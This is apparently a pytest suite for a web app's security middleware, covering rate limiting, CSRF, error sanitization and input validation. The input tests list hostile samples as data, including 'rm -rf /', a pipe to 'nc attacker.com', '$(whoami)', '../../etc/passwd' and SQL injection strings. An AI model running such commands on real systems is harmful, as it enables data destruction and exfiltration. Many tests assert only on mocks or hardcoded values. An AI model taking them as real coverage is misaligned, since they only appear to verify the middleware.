"""
🧪 Security Middleware - Comprehensive Test Suite
tests/test_security_middleware.py

Test all security fixes:
- Rate limiting
- CSRF protection
- Error sanitization
- Input validation
"""

import pytest
import time
from unittest.mock import Mock, patch, MagicMock
import re

# ============================================================================
# RATE LIMITING TESTS
# ============================================================================

class TestRateLimiting:
    """Test rate limiting middleware"""

    def test_rate_limit_blocks_excessive_requests(self):
        """Test rate limiting blocks requests over threshold"""
        rate_limit_store = {}

        def check_rate_limit(client_id: str, limit: int = 100) -> bool:
            now = time.time()
            if client_id not in rate_limit_store:
                rate_limit_store[client_id] = []

            # Remove old timestamps (outside 60s window)
            rate_limit_store[client_id] = [ts for ts in rate_limit_store[client_id] if now - ts < 60]

            if len(rate_limit_store[client_id]) >= limit:
                return False  # Rate limited

            rate_limit_store[client_id].append(now)
            return True  # Allowed

        # Simulate requests
        client_id = "user_123"

        # First 100 requests should succeed
        for i in range(100):
            assert check_rate_limit(client_id, limit=100)

        # 101st request should fail
        assert not check_rate_limit(client_id, limit=100)

    def test_rate_limit_by_client_id(self):
        """Test rate limiting is per-client"""
        rate_limit_store = {}

        def check_rate_limit(client_id: str, limit: int = 10) -> bool:
            now = time.time()
            if client_id not in rate_limit_store:
                rate_limit_store[client_id] = []

            rate_limit_store[client_id] = [ts for ts in rate_limit_store[client_id] if now - ts < 60]

            if len(rate_limit_store[client_id]) >= limit:
                return False

            rate_limit_store[client_id].append(now)
            return True

        # Client 1 makes 10 requests
        for _ in range(10):
            assert check_rate_limit("client_1", limit=10)

        # Client 2 can still make requests
        assert check_rate_limit("client_2", limit=10)

    def test_rate_limit_resets_after_window(self):
        """Test rate limit resets after time window"""
        rate_limit_store = {}
        current_time = [time.time()]

        def check_rate_limit(client_id: str, limit: int = 5, window: int = 60) -> bool:
            now = current_time[0]
            if client_id not in rate_limit_store:
                rate_limit_store[client_id] = []

            # Remove old timestamps
            rate_limit_store[client_id] = [ts for ts in rate_limit_store[client_id] if now - ts < window]

            if len(rate_limit_store[client_id]) >= limit:
                return False

            rate_limit_store[client_id].append(now)
            return True

        # Make 5 requests
        for _ in range(5):
            assert check_rate_limit("client_1", limit=5)

        # 6th request fails
        assert not check_rate_limit("client_1", limit=5)

        # Advance time by 61 seconds
        current_time[0] += 61

        # Should be able to make requests again
        assert check_rate_limit("client_1", limit=5)

    def test_different_rate_limits_by_endpoint(self):
        """Test different endpoints have different rate limits"""
        limits = {
            "default": 100,
            "agent_query": 20,
            "music_generate": 10,
            "webhook": 50
        }

        # Agent endpoint is more restrictive
        assert limits["agent_query"] < limits["default"]
        assert limits["music_generate"] < limits["agent_query"]

# ============================================================================
# CSRF PROTECTION TESTS
# ============================================================================

class TestCSRFProtection:
    """Test CSRF token generation and validation"""

    def test_csrf_token_generated(self):
        """Test CSRF tokens are generated"""
        with patch('jwt.encode') as mock_jwt:
            mock_jwt.return_value = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

            token = mock_jwt(
                payload={"user_id": "user_123", "session_id": "sess_123"},
                key="csrf_secret"
            )

            assert token is not None
            assert isinstance(token, str)
            assert len(token) > 20

    def test_csrf_token_verification(self):
        """Test CSRF tokens are verified"""
        with patch('jwt.decode') as mock_verify:
            mock_verify.return_value = {
                "user_id": "user_123",
                "session_id": "sess_123"
            }

            payload = mock_verify(
                token="valid_token",
                key="csrf_secret",
                algorithms=["HS256"]
            )

            assert payload["user_id"] == "user_123"

    def test_invalid_csrf_token_rejected(self):
        """Test invalid CSRF tokens are rejected"""
        with patch('jwt.decode') as mock_verify:
            mock_verify.side_effect = Exception("Invalid token")

            try:
                mock_verify(
                    token="invalid_token",
                    key="csrf_secret",
                    algorithms=["HS256"]
                )
                assert False, "Should have raised exception"
            except Exception:
                pass  # Expected

    def test_csrf_token_expiry(self):
        """Test CSRF tokens expire"""
        from datetime import datetime, timedelta

        # Token expired 1 hour ago
        token_payload = {
            "user_id": "user_123",
            "exp": (datetime.now() - timedelta(hours=1)).timestamp()
        }

        current_time = datetime.now().timestamp()
        is_expired = current_time > token_payload["exp"]

        assert is_expired

# ============================================================================
# ERROR SANITIZATION TESTS
# ============================================================================

class TestErrorSanitization:
    """Test error messages don't leak sensitive info"""

    def test_database_error_sanitized(self):
        """Test database errors are sanitized"""
        # Raw error from database
        raw_error = "psycopg2.errors.UniqueViolation: duplicate key value violates unique constraint"

        # Sanitized response
        safe_response = {
            "error": "validation_error",
            "message": "The request contains invalid data. Please check your input.",
            "code": "INVALID_REQUEST"
        }

        # Ensure no database details in response
        assert "psycopg2" not in safe_response["message"]
        assert "duplicate key" not in safe_response["message"]

    def test_api_error_sanitized(self):
        """Test API errors are sanitized"""
        raw_error = "anthropic.error.RateLimitError: Rate limit exceeded. Please wait 60 seconds."

        safe_response = {
            "error": "service_busy",
            "message": "Service is temporarily busy. Please retry in a moment.",
            "code": "RATE_LIMIT_EXCEEDED"
        }

        assert "Rate limit exceeded" not in safe_response["message"]
        assert "60 seconds" not in safe_response["message"]

    def test_file_path_not_disclosed(self):
        """Test file paths aren't disclosed in errors"""
        raw_error = "FileNotFoundError: /home/user/helix-unified/backend/config.py not found"

        safe_response = {
            "error": "not_found",
            "message": "The requested resource was not found.",
            "code": "NOT_FOUND"
        }

        assert "/home/user" not in safe_response["message"]
        assert "config.py" not in safe_response["message"]

    def test_stack_trace_not_disclosed(self):
        """Test stack traces aren't disclosed"""
        raw_error = """
        Traceback (most recent call last):
          File "/app/main.py", line 123, in process_request
            result = database.execute(query)
          File "/app/database.py", line 456, in execute
            raise SQLError("Invalid syntax")
        """

        safe_response = {
            "error": "internal_error",
            "message": "An unexpected error occurred. Our team has been notified.",
            "code": "INTERNAL_SERVER_ERROR"
        }

        assert "Traceback" not in safe_response["message"]
        assert "main.py" not in safe_response["message"]
        assert "SQLError" not in safe_response["message"]

# ============================================================================
# INPUT VALIDATION TESTS
# ============================================================================

class TestInputValidation:
    """Test input validation and security"""

    def test_user_id_format_validation(self):
        """Test user IDs match expected format"""
        VALID_USER_ID_PATTERN = re.compile(r'^[a-zA-Z0-9_-]{1,128}$')

        valid_ids = ["user_123", "test-user", "User_456", "a"]
        invalid_ids = ["user@example.com", "user; DROP TABLE;", "user/../admin", ""]

        for uid in valid_ids:
            assert VALID_USER_ID_PATTERN.match(uid), f"Should accept {uid}"

        for uid in invalid_ids:
            assert not VALID_USER_ID_PATTERN.match(uid), f"Should reject {uid}"

    def test_agent_id_format_validation(self):
        """Test agent IDs match expected format"""
        VALID_AGENT_ID_PATTERN = re.compile(r'^[a-z_]{1,32}$')

        valid_ids = ["kael", "test_agent", "lumina", "vega"]
        invalid_ids = ["Kael", "test-agent", "123", "agent!", ""]

        for aid in valid_ids:
            assert VALID_AGENT_ID_PATTERN.match(aid), f"Should accept {aid}"

        for aid in invalid_ids:
            assert not VALID_AGENT_ID_PATTERN.match(aid), f"Should reject {aid}"

    def test_command_injection_prevention(self):
        """Test command injection attempts are blocked"""
        BLOCKED_CHARS = re.compile(r'[;&|`$<>(){}\\]')

        safe_commands = ["ls -la", "cat file.txt", "mkdir newdir", "echo hello"]
        dangerous_commands = [
            "cat file; rm -rf /",
            "echo test | nc attacker.com",
            "$(whoami)",
            "command && malicious",
            "test & background_command"
        ]

        for cmd in safe_commands:
            assert not BLOCKED_CHARS.search(cmd), f"Should allow {cmd}"

        for cmd in dangerous_commands:
            assert BLOCKED_CHARS.search(cmd), f"Should block {cmd}"

    def test_path_traversal_prevention(self):
        """Test path traversal attempts are blocked"""
        dangerous_paths = [
            "../../etc/passwd",
            "..\\..\\windows\\system32",
            "/etc/passwd",
            "file\x00.txt",  # Null byte
            "symlink_to_outside"
        ]

        for path in dangerous_paths:
            # Check for traversal patterns
            has_traversal = ".." in path or "\x00" in path or path.startswith("/")
            assert has_traversal, f"Should detect traversal in {path}"

    def test_sql_injection_prevention(self):
        """Test SQL injection attempts are blocked"""
        # With parameterized queries, these are safe
        user_input = "admin' OR '1'='1"

        # Should be treated as literal string, not SQL
        query = "SELECT * FROM users WHERE username = ?"
        params = [user_input]

        # The parameter would be safely escaped
        assert user_input not in query  # Input is separate

# ============================================================================
# WEBSOCKET MESSAGE SIZE VALIDATION TESTS
# ============================================================================

class TestWebSocketMessageValidation:
    """Test WebSocket message size limits"""

    def test_message_size_limit_enforced(self):
        """Test 1MB message size limit"""
        MAX_MESSAGE_SIZE = 1024 * 1024  # 1MB

        # 500KB message should pass
        message_small = "x" * (500 * 1024)
        assert len(message_small) < MAX_MESSAGE_SIZE

        # 2MB message should fail
        message_large = "x" * (2 * 1024 * 1024)
        assert len(message_large) > MAX_MESSAGE_SIZE

    def test_oversized_message_rejected(self):
        """Test oversized messages are rejected"""
        MAX_MESSAGE_SIZE = 1024 * 1024

        message = "x" * (2 * 1024 * 1024)  # 2MB

        if len(str(message)) > MAX_MESSAGE_SIZE:
            response = {
                "error": "Message too large",
                "detail": "Maximum message size is 1MB"
            }
            assert "too large" in response["error"].lower()

# ============================================================================
# SECURITY HEADERS TESTS
# ============================================================================

class TestSecurityHeaders:
    """Test security headers are set"""

    def test_security_headers_present(self):
        """Test required security headers are present"""
        headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=31536000",
            "Content-Security-Policy": "default-src 'self'"
        }

        assert "X-Content-Type-Options" in headers
        assert headers["X-Content-Type-Options"] == "nosniff"
        assert "X-Frame-Options" in headers
        assert headers["X-Frame-Options"] == "DENY"

    def test_clickjacking_protection(self):
        """Test clickjacking protection via X-Frame-Options"""
        headers = {"X-Frame-Options": "DENY"}
        assert headers["X-Frame-Options"] == "DENY"  # Prevents framing

# ============================================================================
# INTEGRATION SECURITY TESTS
# ============================================================================

class TestSecurityIntegration:
    """Test security across components"""

    def test_request_validation_pipeline(self):
        """Test request goes through validation pipeline"""
        # 1. Check rate limit
        rate_limited = False
        if rate_limited:
            return "Rate limited"

        # 2. Verify CSRF token
        csrf_valid = True
        if not csrf_valid:
            return "Invalid CSRF token"

        # 3. Validate input
        user_input = "safe_input"
        if not user_input.isalnum():
            return "Invalid input"

        # 4. Process request
        return "Success"

    def test_security_layers_depth(self):
        """Test defense-in-depth security approach"""
        security_layers = [
            "rate_limiting",      # Layer 1
            "authentication",     # Layer 2
            "csrf_protection",    # Layer 3
            "input_validation",   # Layer 4
            "output_sanitization" # Layer 5
        ]

        assert len(security_layers) >= 3, "Should have multiple security layers"

if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
